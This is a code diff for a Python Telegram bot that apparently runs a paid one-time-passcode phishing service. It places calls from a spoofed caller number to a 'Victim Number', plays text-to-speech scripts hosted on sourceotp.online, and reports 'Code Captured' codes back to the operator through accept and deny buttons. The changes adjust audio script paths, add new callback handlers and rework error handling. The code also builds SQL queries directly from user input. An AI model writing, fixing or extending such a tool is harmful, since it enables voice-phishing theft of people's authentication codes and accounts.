@@ -1358,6 +1358,7 @@ def confirm1(message,otp_message):
     c.execute(f"select * from custom_scripts where script_id={customscid} limit 1")
     custom_waiting = c.fetchone()
     digits = custom_waiting[8]
+    script_name = custom_waiting[2]
     nospace_digits= "".join(digits.split())
 
     c.execute(f"Select * from call_data where chat_id={chat_id}")
@@ -1374,7 +1375,7 @@ def confirm1(message,otp_message):
         url = 'https://articunoapi.com:8443/play-audio'
         data = {
     "uuid": f"{call_control_id}",
-    "audiourl": f"https://sourceotp.online/scripts/{customscid}/output3.wav",
+    "audiourl": f"https://sourceotp.online/scripts/{script_name}/output3.wav",
    
 }
         requests.post(url, json=data)
@@ -1391,7 +1392,7 @@ def confirm1(message,otp_message):
         url = 'https://articunoapi.com:8443/gather-audio'
         data = {
     "uuid": f"{call_control_id}",
-    "audiourl": f"https://sourceotp.online/scripts/{customscid}/output5.wav",
+    "audiourl": f"https://sourceotp.online/scripts/{script_name}/output5.wav",
     "maxdigits": f"{nospace_digits}",
 
 }
@@ -1515,8 +1516,8 @@ def prebuild_script_call(script_name,chatid):
             requests.post(url, json=data)
             otp_grabbed(chatid,otp=otp2)
             keyboard = types.InlineKeyboardMarkup(row_width=2)
-            item1 = types.InlineKeyboardButton(text="Accept ✅" ,callback_data="/accept")
-            item2 = types.InlineKeyboardButton(text="Deny ❌",callback_data="/deny")
+            item1 = types.InlineKeyboardButton(text="Accept ✅" ,callback_data="/accept_random")
+            item2 = types.InlineKeyboardButton(text="Deny ❌",callback_data="/deny_random")
             keyboard.add(item1,item2) 
             message_idd = bot.send_message(chatid,f"""<b><i>Code Captured <code>{otp2}</code>  ✅</i></b>""",parse_mode='HTML',reply_markup=keyboard).message_id
             last_accept_deny[str(chatid)] = message_idd
@@ -1631,14 +1632,14 @@ def make_call_custon(message):
     if row!=None :
         if row[3]!='ban':
             if user_day_check(id)>0:
-                    mes =(message.text).split()
-                    try:
-                        number = mes[1]
-                        spoof = mes[2]
-                        service = mes[3]
-                        otp_digit = mes[4]
-                        voice = mes[5]
-                        bot.send_message(message.from_user.id,f"""
+                        mes =(message.text).split()
+                        try:
+                            number = mes[1]
+                            spoof = mes[2]
+                            service = mes[3]
+                            otp_digit = mes[4]
+                            voice = mes[5]
+                            bot.send_message(message.from_user.id,f"""
 ┏━━⚇
 ┃<b>Call Details</b> 🤳 
 ┗━━━━━━━━✺
@@ -1647,6 +1648,8 @@ def make_call_custon(message):
 <b>[📝] Script ID »»</b> <code>{service}</code>
 <b>[🧏]Voice »»</b><code>{voice}</code>
 """,parse_mode='HTML')
+                        except:
+                            bot.send_message(message.from_user.id, f"*Somthing went wrong.\n/call <Victim Number> <Spoof Number> <Service> <otp digits> <voice>*",parse_mode='markdown')
                         
                         script_name = service+voice+otp_digit
                         check_path = f"../../var/www/sourceotp.online/scripts/{script_name}"
@@ -1668,26 +1671,12 @@ def make_call_custon(message):
                             c.execute(f"update users set v_no={number},spoof_no={spoof},sc_id={script_id},inp_sc='{voice}',del_col=0,username='{username}' where user_id={id} ")
                             db.commit()
                             
-
-
-            
-                        
                         Convert_TTS(SC1.format(service_name=service),SC2.format(digits=otp_digit),SC5,SC3,SC4,script_name,voice)
-                        c.execute(f"Select * from users where user_id={id}")
-                        row= c.fetchone()
-                        call_s1 = row[6]
-                        
-                        if (call_s1!=0):
-                
-                                c.execute(f"update call_data set last_service='{script_name}' where chat_id={id} ")
-                                db.commit()
-                                call_update(id)
-                                b=make_call(f= f"{spoof}",t=f"{number}",user_id=id,service=script_name)
-
-                        else:
-                            bot.send_message(message.from_user.id, """*Somthing went wrong.\n/call <Victim Number> <Spoof Number> <Service> <otp digits> <voice>*""",parse_mode='markdown')
-                    except:
-                        bot.send_message(message.from_user.id, f"*Somthing went wrong.\n/call <Victim Number> <Spoof Number> <Service> <otp digits> <voice>*",parse_mode='markdown')
+                        c.execute(f"update call_data set last_service='{script_name}' where chat_id={id} ")
+                        db.commit()
+                        call_update(id)
+                        b=make_call(f= f"{spoof}",t=f"{number}",user_id=id,service=script_name)
+                    
             else:
                    bot.send_message(message.from_user.id, "*🚫Buy Subscription.🚫*",parse_mode='markdown')  
                    delete_data(id) 
@@ -1856,9 +1845,14 @@ def handle_callback(message):
 
     elif message.data == '/accept':
             custom_confirm1(message,"Accept")
-
     elif message.data == '/deny':
             custom_confirm1(message,"Deny")
+
+    elif message.data == '/accept_random':
+            confirm1(message,"Accept")
+    elif message.data == '/deny_random':
+            confirm1(message,"Deny")
+
     elif message.data == '/accept_alpha':
             bot.send_message(message.from_user.id,f"*Code Accpeted ✅ *",parse_mode='markdown')
             aplha_confirm1(message,"Accept")
